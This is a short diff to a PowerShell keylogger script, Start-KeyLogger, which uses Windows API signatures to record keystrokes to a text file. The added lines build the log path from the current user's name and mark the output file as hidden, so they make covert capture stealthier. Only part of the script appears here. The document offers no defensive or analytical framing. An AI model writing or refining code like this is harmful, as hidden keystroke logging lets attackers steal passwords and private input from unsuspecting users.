@@ -1,4 +1,4 @@
-function Start-KeyLogger($Path="C:\Users\francesco\Desktop\k.txt") 
+function Start-KeyLogger($Path="C:\Users\" + (Get-Item env:\USERNAME).value + "\Desktop\k.txt") 
 {
   # Signatures for API Calls
   $signatures = @'
@@ -17,6 +17,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     
   # create output file
   $null = New-Item -Path $Path -ItemType File -Force
+  $f=get-item $Path -Force
+  $f.attributes = "Hidden"
 
   try
   {
